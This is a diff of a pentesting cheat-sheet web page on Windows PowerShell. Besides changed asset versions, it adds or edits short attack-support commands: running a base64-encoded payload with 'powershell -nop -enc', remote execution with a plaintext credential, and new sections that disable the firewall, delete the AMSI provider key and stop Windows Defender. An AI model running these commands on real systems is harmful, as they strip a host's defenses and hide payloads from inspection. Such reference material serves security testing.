@@ -27,12 +27,12 @@
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="/resources/css/retype.css?v=2.1.701915052401" rel="stylesheet" data-turbo-track="reload" />
+    <link href="/resources/css/retype.css?v=2.1.701918822568" rel="stylesheet" data-turbo-track="reload" />
 
-    <script type="text/javascript" src="/resources/js/config.js?v=2.1.701915052401" defer data-turbo-track="reload"></script>
+    <script type="text/javascript" src="/resources/js/config.js?v=2.1.701918822568" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=2.1" defer data-turbo-track="reload"></script>
-    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.1.701915052401" defer></script>
-    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.1.701915052401" defer></script>
+    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.1.701918822568" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.1.701918822568" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -200,8 +200,8 @@
 $ echo -n 'ping -n 2 10.10.14.2' | iconv -t utf-16le | base64 -w 0
 cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA==
 
-# Run PowerShell Encoded
-Payload: cmd /c powershell -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA==
+# Run PowerShell with Encoded flag
+Payload: cmd /c powershell -nop -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA==
 </code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="run-command-as-user-with-creds">
@@ -213,7 +213,6 @@ Payload: cmd /c powershell -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQA
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">$pass = ConvertTo-SecureString &quot;aliceishere&quot; -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential(&quot;disco\\Alice&quot;, $pass)
-
 Invoke-Command -ComputerName disco -Credential $cred -ScriptBlock {whoami}</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="list-running-process-with-args">
@@ -241,11 +240,11 @@ PS &gt; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(&quot;172.
 <doc-anchor-target id="powershell">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#powershell">#</doc-anchor-trigger>
-        <span><strong>PowerShell</strong></span>
+        <span>PowerShell</span>
     </h2>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell"># **PowerShell Directory**
+<pre class="language-powershell"><code v-pre class="language-powershell"># PowerShell Directory
 c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
 # FIX THE VARIABLE PATH
@@ -260,20 +259,44 @@ set PATH=%SystemRoot%\system32;%SystemRoot%;</code></pre>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">Get-Childitem –Path C:\ -Include *filetosearch* -Recurse -ErrorAction SilentlyContinue</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="firewall-disable">
+<doc-anchor-target id="windows-security">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#firewall-disable">#</doc-anchor-trigger>
-        <span>Firewall Disable</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#windows-security">#</doc-anchor-trigger>
+        <span>Windows Security</span>
     </h2>
+</doc-anchor-target>
+<doc-anchor-target id="disable-firewall">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#disable-firewall">#</doc-anchor-trigger>
+        <span>Disable Firewall</span>
+    </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">NetSh Advfirewall set allprofiles state off</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="can-not-run-scripts-enable-it">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#can-not-run-scripts-enable-it">#</doc-anchor-trigger>
-        <span><strong>Can not run scripts?</strong> Enable it!</span>
-    </h2>
+<doc-anchor-target id="disable-amsi">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#disable-amsi">#</doc-anchor-trigger>
+        <span>Disable AMSI</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">Remove-Item -Path &quot;HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}&quot; -Recurse</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="disable-defender">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#disable-defender">#</doc-anchor-trigger>
+        <span>Disable Defender</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">sc stop WinDefend</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="execution-policy">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#execution-policy">#</doc-anchor-trigger>
+        <span>Execution Policy</span>
+    </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">Set-ExecutionPolicy Unrestricted
